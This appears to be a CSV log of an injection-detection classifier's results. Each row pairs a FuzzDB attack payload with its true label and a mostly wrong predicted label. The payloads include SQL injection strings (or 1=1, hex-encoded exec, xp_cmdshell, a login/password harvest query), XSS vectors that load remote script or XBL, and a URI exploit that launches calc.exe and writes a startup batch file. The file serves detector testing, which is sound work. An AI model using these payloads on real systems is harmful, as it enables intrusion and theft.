id,payload,actual,predicted
fuzzdb_156,%26,sql_injection,benign
fuzzdb_157,%27%20or%201=1,sql_injection,benign
fuzzdb_158,%28,sql_injection,benign
fuzzdb_159,%29,sql_injection,benign
fuzzdb_160,%2A%28%7C%28mail%3D%2A%29%29,sql_injection,benign
fuzzdb_161,%2A%28%7C%28objectclass%3D%2A%29%29,sql_injection,benign
fuzzdb_162,%2A%7C,sql_injection,benign
fuzzdb_163,||6,sql_injection,benign
fuzzdb_164,'||'6,sql_injection,benign
fuzzdb_165,(||6),sql_injection,benign
fuzzdb_166,%7C,sql_injection,benign
fuzzdb_167,a',sql_injection,benign
fuzzdb_177,&apos;%20OR,sql_injection,benign
fuzzdb_178,as,sql_injection,benign
fuzzdb_179,asc,sql_injection,benign
fuzzdb_181,'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login >,sql_injection,benign
fuzzdb_182,bfilename,sql_injection,benign
fuzzdb_183,char%4039%41%2b%40SELECT,sql_injection,benign
fuzzdb_184,declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),sql_injection,benign
fuzzdb_185,declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q),sql_injection,benign
fuzzdb_186,declare @q nvarchar (4000) select @q =,sql_injection,benign
fuzzdb_187,declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s),sql_injection,benign
fuzzdb_188,declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s),sql_injection,benign
fuzzdb_189,declare @s varchar(22) select @s =,sql_injection,benign
fuzzdb_190,declare @s varchar (8000) select @s = 0x73656c65637420404076657273696f6e,sql_injection,benign
fuzzdb_191,delete,sql_injection,benign
fuzzdb_192,desc,sql_injection,benign
fuzzdb_193,distinct,sql_injection,benign
fuzzdb_194,"'||(elt(-3+5,bin(15),ord(10),hex(char(45))))",sql_injection,benign
fuzzdb_195,'; exec master..xp_cmdshell,sql_injection,benign
fuzzdb_197,exec(@s),sql_injection,benign
fuzzdb_198,'; exec ('sel' + 'ect us' + 'er'),sql_injection,benign
fuzzdb_199,exec sp,sql_injection,benign
fuzzdb_200,'; execute immediate 'sel' || 'ect us' || 'er',sql_injection,benign
fuzzdb_201,exec xp,sql_injection,benign
fuzzdb_202,'; exec xp_regread,sql_injection,benign
fuzzdb_204,handler,sql_injection,benign
fuzzdb_205,having,sql_injection,benign
fuzzdb_209,"""hi"""") or (""""a""""=""""a""",sql_injection,benign
fuzzdb_210,hi or a=a,sql_injection,benign
fuzzdb_212,hi') or ('a'='a,sql_injection,benign
fuzzdb_214,insert,sql_injection,benign
fuzzdb_215,like,sql_injection,benign
fuzzdb_216,limit,sql_injection,benign
fuzzdb_217,*(|(mail=*)),sql_injection,benign
fuzzdb_218,*(|(objectclass=*)),sql_injection,benign
fuzzdb_219,or,sql_injection,benign
fuzzdb_229,; or '1'='1',sql_injection,benign
fuzzdb_239,or 1=1,sql_injection,benign
fuzzdb_241,"or 1=1 or """"=",sql_injection,benign
fuzzdb_244,or%201=1,sql_injection,benign
fuzzdb_251,or a=a,sql_injection,benign
fuzzdb_252,or a = a,sql_injection,benign
fuzzdb_255,') or ('a'='a,sql_injection,benign
fuzzdb_256,""" or ""a""=""a",sql_injection,benign
fuzzdb_257,) or (a=a,sql_injection,benign
fuzzdb_258,order by,sql_injection,benign
fuzzdb_259,' or (EXISTS),sql_injection,benign
fuzzdb_260,or isNULL(1/0) /*,sql_injection,benign
fuzzdb_261,""" or isNULL(1/0) /*",sql_injection,benign
fuzzdb_266,' or uid like '%,sql_injection,benign
fuzzdb_267,' or uname like '%,sql_injection,benign
fuzzdb_269,' or userid like '%,sql_injection,benign
fuzzdb_270,' or user like '%,sql_injection,benign
fuzzdb_271,' or username like '%,sql_injection,benign
fuzzdb_272,' or username like char(37);,sql_injection,benign
fuzzdb_276,PRINT,sql_injection,benign
fuzzdb_277,PRINT @@variable,sql_injection,benign
fuzzdb_278,procedure,sql_injection,benign
fuzzdb_279,replace,sql_injection,benign
fuzzdb_280,select,sql_injection,benign
fuzzdb_283,' (select top 1,sql_injection,benign
fuzzdb_285,'sqlattempt1,sql_injection,benign
fuzzdb_286,(sqlattempt2),sql_injection,benign
fuzzdb_287,'sqlvuln,sql_injection,benign
fuzzdb_288,'+sqlvuln,sql_injection,benign
fuzzdb_289,(sqlvuln),sql_injection,benign
fuzzdb_290,sqlvuln;,sql_injection,benign
fuzzdb_292,to_timestamp_tz,sql_injection,benign
fuzzdb_293,truncate,sql_injection,benign
fuzzdb_294,tz_offset,sql_injection,benign
fuzzdb_303,update,sql_injection,benign
fuzzdb_304,'||UTL_HTTP.REQUEST,sql_injection,benign
fuzzdb_305,",@variable",sql_injection,benign
fuzzdb_306,@variable,sql_injection,benign
fuzzdb_314,x' OR full_name LIKE '%Bob%,sql_injection,benign
fuzzdb_316,<,xss,benign
fuzzdb_317,%3C,xss,benign
fuzzdb_318,%253C,xss,benign
fuzzdb_319,%25253C,xss,benign
fuzzdb_320,&lt,xss,benign
fuzzdb_321,&lt;,xss,benign
fuzzdb_322,&LT,xss,benign
fuzzdb_323,&LT;,xss,benign
fuzzdb_324,&#60,xss,sql_injection
fuzzdb_325,&#060,xss,sql_injection
fuzzdb_326,&#0060,xss,sql_injection
fuzzdb_327,&#00060,xss,sql_injection
fuzzdb_328,&#000060,xss,sql_injection
fuzzdb_329,&#0000060,xss,sql_injection
fuzzdb_330,&#60;,xss,sql_injection
fuzzdb_331,&#060;,xss,sql_injection
fuzzdb_332,&#0060;,xss,sql_injection
fuzzdb_333,&#00060;,xss,sql_injection
fuzzdb_334,&#000060;,xss,sql_injection
fuzzdb_335,&#0000060;,xss,sql_injection
fuzzdb_336,&#x3c,xss,sql_injection
fuzzdb_337,&#x03c,xss,sql_injection
fuzzdb_338,&#x003c,xss,sql_injection
fuzzdb_339,&#x0003c,xss,sql_injection
fuzzdb_340,&#x00003c,xss,sql_injection
fuzzdb_341,&#x000003c,xss,sql_injection
fuzzdb_342,&#x3c;,xss,sql_injection
fuzzdb_343,&#x03c;,xss,sql_injection
fuzzdb_344,&#x003c;,xss,sql_injection
fuzzdb_345,&#x0003c;,xss,sql_injection
fuzzdb_346,&#x00003c;,xss,sql_injection
fuzzdb_347,&#x000003c;,xss,sql_injection
fuzzdb_348,&#X3c,xss,sql_injection
fuzzdb_349,&#X03c,xss,sql_injection
fuzzdb_350,&#X003c,xss,sql_injection
fuzzdb_351,&#X0003c,xss,sql_injection
fuzzdb_352,&#X00003c,xss,sql_injection
fuzzdb_353,&#X000003c,xss,sql_injection
fuzzdb_354,&#X3c;,xss,sql_injection
fuzzdb_355,&#X03c;,xss,sql_injection
fuzzdb_356,&#X003c;,xss,sql_injection
fuzzdb_357,&#X0003c;,xss,sql_injection
fuzzdb_358,&#X00003c;,xss,sql_injection
fuzzdb_359,&#X000003c;,xss,sql_injection
fuzzdb_360,&#x3C,xss,sql_injection
fuzzdb_361,&#x03C,xss,sql_injection
fuzzdb_362,&#x003C,xss,sql_injection
fuzzdb_363,&#x0003C,xss,sql_injection
fuzzdb_364,&#x00003C,xss,sql_injection
fuzzdb_365,&#x000003C,xss,sql_injection
fuzzdb_366,&#x3C;,xss,sql_injection
fuzzdb_367,&#x03C;,xss,sql_injection
fuzzdb_368,&#x003C;,xss,sql_injection
fuzzdb_369,&#x0003C;,xss,sql_injection
fuzzdb_370,&#x00003C;,xss,sql_injection
fuzzdb_371,&#x000003C;,xss,sql_injection
fuzzdb_372,&#X3C,xss,sql_injection
fuzzdb_373,&#X03C,xss,sql_injection
fuzzdb_374,&#X003C,xss,sql_injection
fuzzdb_375,&#X0003C,xss,sql_injection
fuzzdb_376,&#X00003C,xss,sql_injection
fuzzdb_377,&#X000003C,xss,sql_injection
fuzzdb_378,&#X3C;,xss,sql_injection
fuzzdb_379,&#X03C;,xss,sql_injection
fuzzdb_380,&#X003C;,xss,sql_injection
fuzzdb_381,&#X0003C;,xss,sql_injection
fuzzdb_382,&#X00003C;,xss,sql_injection
fuzzdb_383,&#X000003C;,xss,sql_injection
fuzzdb_384,\x3c,xss,benign
fuzzdb_385,\x3C,xss,benign
fuzzdb_386,\u003c,xss,benign
fuzzdb_387,\u003C,xss,benign
fuzzdb_388,onAbort,xss,benign
fuzzdb_389,onBlur,xss,benign
fuzzdb_390,onChange,xss,benign
fuzzdb_391,onClick,xss,benign
fuzzdb_392,onDblClick,xss,benign
fuzzdb_393,onDragDrop,xss,benign
fuzzdb_394,onError,xss,benign
fuzzdb_395,onFocus,xss,benign
fuzzdb_396,onKeyDown,xss,benign
fuzzdb_397,onKeyPress,xss,benign
fuzzdb_398,onKeyUp,xss,benign
fuzzdb_399,onLoad,xss,benign
fuzzdb_400,onMouseDown,xss,benign
fuzzdb_401,onMouseMove,xss,benign
fuzzdb_402,onMouseOut,xss,benign
fuzzdb_403,onMouseOver,xss,benign
fuzzdb_404,onMouseUp,xss,benign
fuzzdb_405,onMove,xss,benign
fuzzdb_406,onReset,xss,benign
fuzzdb_407,onResize,xss,benign
fuzzdb_408,onSelect,xss,benign
fuzzdb_409,onSubmit,xss,benign
fuzzdb_410,onabort,xss,benign
fuzzdb_411,onactivate,xss,benign
fuzzdb_412,onafterprint,xss,benign
fuzzdb_413,onafterupdate,xss,benign
fuzzdb_414,onanimationend,xss,benign
fuzzdb_415,onanimationiteration,xss,benign
fuzzdb_416,onanimationstart,xss,benign
fuzzdb_417,onautocomplete,xss,benign
fuzzdb_418,onautocompleteerror,xss,benign
fuzzdb_419,onbeforeactivate,xss,benign
fuzzdb_420,onbeforecopy,xss,benign
fuzzdb_421,onbeforecut,xss,benign
fuzzdb_422,onbeforedeactivate,xss,benign
fuzzdb_423,onbeforeeditfocus,xss,benign
fuzzdb_424,onbeforepaste,xss,benign
fuzzdb_425,onbeforeprint,xss,benign
fuzzdb_426,onbeforeunload,xss,benign
fuzzdb_427,onbeforeupdate,xss,benign
fuzzdb_428,onbegin,xss,benign
fuzzdb_429,onblur,xss,benign
fuzzdb_430,onbounce,xss,benign
fuzzdb_431,oncancel,xss,benign
fuzzdb_432,oncanplay,xss,benign
fuzzdb_433,oncanplaythrough,xss,benign
fuzzdb_434,oncellchange,xss,benign
fuzzdb_435,onchange,xss,benign
fuzzdb_436,onclick,xss,benign
fuzzdb_437,onclose,xss,benign
fuzzdb_438,oncompassneedscalibration,xss,benign
fuzzdb_439,oncontextmenu,xss,benign
fuzzdb_440,oncontrolselect,xss,benign
fuzzdb_441,oncopy,xss,benign
fuzzdb_442,oncuechange,xss,benign
fuzzdb_443,oncut,xss,benign
fuzzdb_444,ondataavailable,xss,benign
fuzzdb_445,ondatasetchanged,xss,benign
fuzzdb_446,ondatasetcomplete,xss,benign
fuzzdb_447,ondblclick,xss,benign
fuzzdb_448,ondeactivate,xss,benign
fuzzdb_449,ondevicelight,xss,benign
fuzzdb_450,ondevicemotion,xss,benign
fuzzdb_451,ondeviceorientation,xss,benign
fuzzdb_452,ondeviceproximity,xss,benign
fuzzdb_453,ondrag,xss,benign
fuzzdb_454,ondragdrop,xss,benign
fuzzdb_455,ondragend,xss,benign
fuzzdb_456,ondragenter,xss,benign
fuzzdb_457,ondragexit,xss,benign
fuzzdb_458,ondragleave,xss,benign
fuzzdb_459,ondragover,xss,benign
fuzzdb_460,ondragstart,xss,benign
fuzzdb_461,ondrop,xss,benign
fuzzdb_462,ondurationchange,xss,benign
fuzzdb_463,onemptied,xss,benign
fuzzdb_464,onend,xss,benign
fuzzdb_465,onended,xss,benign
fuzzdb_466,onerror,xss,benign
fuzzdb_467,onerrorupdate,xss,benign
fuzzdb_468,onexit,xss,benign
fuzzdb_469,onfilterchange,xss,benign
fuzzdb_470,onfinish,xss,benign
fuzzdb_471,onfocus,xss,benign
fuzzdb_472,onfocusin,xss,benign
fuzzdb_473,onfocusout,xss,benign
fuzzdb_474,onformchange,xss,benign
fuzzdb_475,onforminput,xss,benign
fuzzdb_476,ongesturechange,xss,benign
fuzzdb_477,ongestureend,xss,benign
fuzzdb_478,ongesturestart,xss,benign
fuzzdb_479,onhashchange,xss,benign
fuzzdb_480,onhelp,xss,benign
fuzzdb_481,oninput,xss,benign
fuzzdb_482,oninvalid,xss,benign
fuzzdb_483,onkeydown,xss,benign
fuzzdb_484,onkeypress,xss,benign
fuzzdb_485,onkeyup,xss,benign
fuzzdb_486,onlanguagechange,xss,benign
fuzzdb_487,onlayoutcomplete,xss,benign
fuzzdb_488,onload,xss,benign
fuzzdb_489,onloadeddata,xss,benign
fuzzdb_490,onloadedmetadata,xss,benign
fuzzdb_491,onloadstart,xss,benign
fuzzdb_492,onlosecapture,xss,benign
fuzzdb_493,onmediacomplete,xss,benign
fuzzdb_494,onmediaerror,xss,benign
fuzzdb_495,onmessage,xss,benign
fuzzdb_496,onmousedown,xss,benign
fuzzdb_497,onmouseenter,xss,benign
fuzzdb_498,onmouseleave,xss,benign
fuzzdb_499,onmousemove,xss,benign
fuzzdb_500,onmouseout,xss,benign
fuzzdb_501,onmouseover,xss,benign
fuzzdb_502,onmouseup,xss,benign
fuzzdb_503,onmousewheel,xss,benign
fuzzdb_504,onmove,xss,benign
fuzzdb_505,onmoveend,xss,benign
fuzzdb_506,onmovestart,xss,benign
fuzzdb_507,onmozfullscreenchange,xss,benign
fuzzdb_508,onmozfullscreenerror,xss,benign
fuzzdb_509,onmozpointerlockchange,xss,benign
fuzzdb_510,onmozpointerlockerror,xss,benign
fuzzdb_511,onmsgesturechange,xss,benign
fuzzdb_512,onmsgesturedoubletap,xss,benign
fuzzdb_513,onmsgesturehold,xss,benign
fuzzdb_514,onmsgesturerestart,xss,benign
fuzzdb_515,onmsinertiastart,xss,benign
fuzzdb_516,onmspointercancel,xss,benign
fuzzdb_517,onmspointerdown,xss,benign
fuzzdb_518,onmspointerenter,xss,benign
fuzzdb_519,onmspointerhover,xss,benign
fuzzdb_520,onmspointerleave,xss,benign
fuzzdb_521,onmspointermove,xss,benign
fuzzdb_522,onmspointerout,xss,benign
fuzzdb_523,onmspointerover,xss,benign
fuzzdb_524,onmspointerup,xss,benign
fuzzdb_525,onoffline,xss,benign
fuzzdb_526,ononline,xss,benign
fuzzdb_527,onorientationchange,xss,benign
fuzzdb_528,onoutofsync,xss,benign
fuzzdb_529,onpagehide,xss,benign
fuzzdb_530,onpageshow,xss,benign
fuzzdb_531,onpaste,xss,benign
fuzzdb_532,onpause,xss,benign
fuzzdb_533,onplay,xss,benign
fuzzdb_534,onplaying,xss,benign
fuzzdb_535,onpopstate,xss,benign
fuzzdb_536,onprogress,xss,benign
fuzzdb_537,onpropertychange,xss,benign
fuzzdb_538,onratechange,xss,benign
fuzzdb_539,onreadystatechange,xss,benign
fuzzdb_540,onreceived,xss,benign
fuzzdb_541,onrepeat,xss,benign
fuzzdb_542,onreset,xss,benign
fuzzdb_543,onresize,xss,benign
fuzzdb_544,onresizeend,xss,benign
fuzzdb_545,onresizestart,xss,benign
fuzzdb_546,onresume,xss,benign
fuzzdb_547,onreverse,xss,benign
fuzzdb_548,onrowdelete,xss,benign
fuzzdb_549,onrowenter,xss,benign
fuzzdb_550,onrowexit,xss,benign
fuzzdb_551,onrowinserted,xss,benign
fuzzdb_552,onrowsdelete,xss,benign
fuzzdb_553,onrowsinserted,xss,benign
fuzzdb_554,onscroll,xss,benign
fuzzdb_555,onsearch,xss,benign
fuzzdb_556,onseek,xss,benign
fuzzdb_557,onseeked,xss,benign
fuzzdb_558,onseeking,xss,benign
fuzzdb_559,onselect,xss,benign
fuzzdb_560,onselectionchange,xss,benign
fuzzdb_561,onselectstart,xss,benign
fuzzdb_562,onshow,xss,benign
fuzzdb_563,onstalled,xss,benign
fuzzdb_564,onstart,xss,benign
fuzzdb_565,onstop,xss,benign
fuzzdb_566,onstorage,xss,benign
fuzzdb_567,onsubmit,xss,benign
fuzzdb_568,onsuspend,xss,benign
fuzzdb_569,onsynchrestored,xss,benign
fuzzdb_570,ontimeerror,xss,benign
fuzzdb_571,ontimeupdate,xss,benign
fuzzdb_572,ontoggle,xss,benign
fuzzdb_573,ontouchcancel,xss,benign
fuzzdb_574,ontouchend,xss,benign
fuzzdb_575,ontouchmove,xss,benign
fuzzdb_576,ontouchstart,xss,benign
fuzzdb_577,ontrackchange,xss,benign
fuzzdb_578,ontransitionend,xss,benign
fuzzdb_579,onunload,xss,benign
fuzzdb_580,onurlflip,xss,benign
fuzzdb_581,onuserproximity,xss,benign
fuzzdb_582,onvolumechange,xss,benign
fuzzdb_583,onwaiting,xss,benign
fuzzdb_584,onwebkitanimationend,xss,benign
fuzzdb_585,onwebkitanimationiteration,xss,benign
fuzzdb_586,onwebkitanimationstart,xss,benign
fuzzdb_587,onwebkitmouseforcechanged,xss,benign
fuzzdb_588,onwebkitmouseforcedown,xss,benign
fuzzdb_589,onwebkitmouseforceup,xss,benign
fuzzdb_590,onwebkitmouseforcewillbegin,xss,benign
fuzzdb_591,onwebkittransitionend,xss,benign
fuzzdb_592,onwebkitwillrevealbottom,xss,benign
fuzzdb_593,onwheel,xss,benign
fuzzdb_594,onzoom,xss,benign
fuzzdb_595,A very short cross browser header injection,xss,benign
fuzzdb_596,Exploit Name: A very short cross browser header injection,xss,benign
fuzzdb_597,Exploit String: with(document)getElementsByTagName('head')[0].appendChild(createElement('script')).src='//ŋ.ws',xss,benign
fuzzdb_598,Exploit Description: This vector shows one of the shortest possible ways to inject external JavaScript into a website's header area.,xss,benign
fuzzdb_599,"Exploit Tags: xss, short, header, injection",xss,benign
fuzzdb_600,Author Name: .mario,xss,benign
fuzzdb_601,Add onclick event hadler,xss,benign
fuzzdb_602,Exploit Name: Add onclick event hadler,xss,benign
fuzzdb_603,Exploit String: onclick=eval/**/(/ale/.source%2b/rt/.source%2b/(7)/.source);,xss,sql_injection
fuzzdb_604,Exploit Description: This vector adds an onclick event handler to a tag and appends an obfuscated JS alert.,xss,benign
fuzzdb_605,"Exploit Tags: general, JS breaking, basic, obfuscated, user interaction",xss,benign
fuzzdb_606,Author Name: kishor,xss,benign
fuzzdb_607,Advanced HTML injection locator,xss,benign
fuzzdb_608,Exploit Name: Advanced HTML injection locator,xss,benign
fuzzdb_609,Exploit String: <s>000<s>%3cs%3e111%3c/s%3e%3c%73%3e%32%32%32%3c%2f%73%3e&#60&#115&#62&#51&#51&#51&#60&#47&#115&#62&#x3c&#x73&#x3e&#x34&#x34&#x34&#x3c&#x2f&#x73&#x3e,xss,sql_injection
fuzzdb_610,Exploit Description: This vector indicates HTML injections by stroked text.,xss,benign
fuzzdb_611,"Exploit Tags: general, html breaking, injection",xss,benign
fuzzdb_612,Author Name: .mario,xss,benign
fuzzdb_613,Advanced XSS Locator,xss,benign
fuzzdb_614,Exploit Name: Advanced XSS Locator,xss,benign
fuzzdb_615,"Exploit String: ';alert(0)//\';alert(1)//"";alert(2)//\"";alert(3)//--></SCRIPT>"">'><SCRIPT>alert(4)</SCRIPT>=&{}"");}alert(6);function xss(){//",xss,sql_injection
fuzzdb_616,Exploit Description: Advanced XSS Locator,xss,benign
fuzzdb_617,"Exploit Tags: general, html breaking, comment breaking, JS breaking",xss,benign
fuzzdb_618,Author Name: .mario,xss,benign
fuzzdb_619,Advanced XSS Locator for title-Injections,xss,benign
fuzzdb_620,Exploit Name: Advanced XSS Locator for title-Injections,xss,benign
fuzzdb_621,"Exploit String: ';alert(0)//\';alert(1)//"";alert(2)//\"";alert(3)//--></SCRIPT>"">'></title><SCRIPT>alert(4)</SCRIPT>=&{</title><script>alert(5)</script>}"");}",xss,sql_injection
fuzzdb_622,Exploit Description: This is a modified version of the XSS Locator from ha.ckers.org especially crafted to check for title injections.,xss,benign
fuzzdb_623,"Exploit Tags: general, html breaking, comment breaking, JS breaking, title breaking",xss,benign
fuzzdb_624,Author Name: .mario,xss,benign
fuzzdb_625,aim: uri exploit,xss,benign
fuzzdb_626,Exploit Name: aim: uri exploit,xss,benign
fuzzdb_627,"Exploit String: aim: &c:\windows\system32\calc.exe"" ini=""C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat""",xss,benign
fuzzdb_628,Exploit Description: This aim-uri executes the calc.exe on vulnerable systems,xss,benign
fuzzdb_629,"Exploit Tags: URI exploits, gecko, injection, general",xss,benign
fuzzdb_630,Author Name: xs-sniper,xss,benign
fuzzdb_631,Backslash-obfuscated XBL injection - variant 1,xss,benign
fuzzdb_632,Exploit Name: Backslash-obfuscated XBL injection - variant 1,xss,benign
fuzzdb_633,Exploit String: <div/style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>,xss,sql_injection
fuzzdb_634,Exploit Description: This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL.,xss,benign
fuzzdb_635,"Exploit Tags: general, injection, gecko, style injection, XBL, obfuscated",xss,benign
fuzzdb_636,Author Name: thespanner.co.uk,xss,benign
fuzzdb_637,Backslash-obfuscated XBL injection - variant 2,xss,benign
fuzzdb_638,Exploit Name: Backslash-obfuscated XBL injection - variant 2,xss,benign
fuzzdb_639,Exploit String: <div/style=&#92&#45&#92&#109&#111&#92&#122&#92&#45&,xss,sql_injection
fuzzdb_640,&#92&#47&#120&#98&#108&#92&#47&#120&#98&#108&#92,xss,sql_injection
fuzzdb_641,&#46&#120&#109&#108&#92&#35&#120&#115&#115&#41&>,xss,sql_injection
fuzzdb_642,Exploit Description: This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL. All important characters are obfuscated by unclosed entities.,xss,benign
fuzzdb_643,"Exploit Tags: general, injection, gecko, style injection, XBL, obfuscated",xss,benign
fuzzdb_644,Author Name: thespanner.co.uk,xss,benign
fuzzdb_645,Backslash-obfuscated XBL injection - variant 3,xss,benign
fuzzdb_646,Exploit Name: Backslash-obfuscated XBL injection - variant 3,xss,benign
fuzzdb_647,Exploit String: <Q%^&*(£@!’” style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>,xss,sql_injection
fuzzdb_648,Exploit Description: This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL. As we can see gecko based browsers accept various characters as valid tags.,xss,benign
fuzzdb_649,"Exploit Tags: general, injection, gecko, style injection, XBL, obfuscated",xss,benign
fuzzdb_650,Author Name: thespanner.co.uk,xss,benign
fuzzdb_651,Backslash-obfuscated XBL injection - variant 4,xss,benign
fuzzdb_652,Exploit Name: Backslash-obfuscated XBL injection - variant 4,xss,benign
fuzzdb_653,Exploit String: <div&nbsp &nbsp style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>,xss,sql_injection
fuzzdb_654,Exploit Description: This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL. Furthermore unclosed NBSP entities are used to obfuscate the string.,xss,benign
fuzzdb_655,"Exploit Tags: general, injection, gecko, style injection, XBL, obfuscated",xss,benign
fuzzdb_656,Author Name: thespanner.co.uk,xss,benign
fuzzdb_657,Backslash-obfuscated XBL injection - variant 5,xss,benign
fuzzdb_658,Exploit Name: Backslash-obfuscated XBL injection - variant 5,xss,benign
fuzzdb_659,Exploit String: <x/style=-m\0o\0z\0-b\0i\0nd\0i\0n\0g\0:\0u\0r\0l\0(\0/\0/b\0u\0s\0i\0ne\0s\0s\0i\0nf\0o\0.c\0o\0.\0u\0k\0/\0la\0b\0s\0/\0x\0b\0l\0/\0x\0b\0l\0.\0x\0m\0l\0#\0x\0s\0s\0)>,xss,sql_injection
fuzzdb_660,Exploit Description: This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL. Between any character of the original payload null bytes are used to obfuscate.,xss,benign
fuzzdb_661,"Exploit Tags: general, injection, gecko, style injection, XBL, obfuscated",xss,benign
fuzzdb_662,Author Name: thespanner.co.uk,xss,benign
fuzzdb_663,BASE,xss,benign
fuzzdb_664,Exploit Name: BASE,xss,benign
fuzzdb_666,"Exploit Description: Works in IE and Netscape 8.1 in safe mode.  You need the // to comment out the next characters so you won't get a JavaScript error and your XSS tag will render.  Also, this relies on the fact that the website uses dynamically placed images like ”images/image.jpg” rather than full paths.  If the path includes a leading forward slash like ”/images/image.jpg” you can remove one slash from this vector (as long as there are two to begin the comment this will work",xss,benign
fuzzdb_667,"Exploit Tags: general, evil tags",xss,benign
fuzzdb_668,Author Name: ha.ckers.org,xss,benign
fuzzdb_669,Basic back ticked attribute breaker,xss,benign
fuzzdb_670,Exploit Name: Basic back ticked attribute breaker,xss,benign
fuzzdb_672,Exploit Description: This vector breaks back ticked attributes.,xss,benign
fuzzdb_673,"Exploit Tags: general, html breaking, basic",xss,benign
fuzzdb_674,Author Name: kishor,xss,benign
fuzzdb_675,Basic double quoted attribute breaker,xss,benign
fuzzdb_676,Exploit Name: Basic double quoted attribute breaker,xss,benign
fuzzdb_678,Exploit Description: This vector breaks double quoted attributes and produces an alert.,xss,benign
fuzzdb_679,"Exploit Tags: general, html breaking",xss,benign
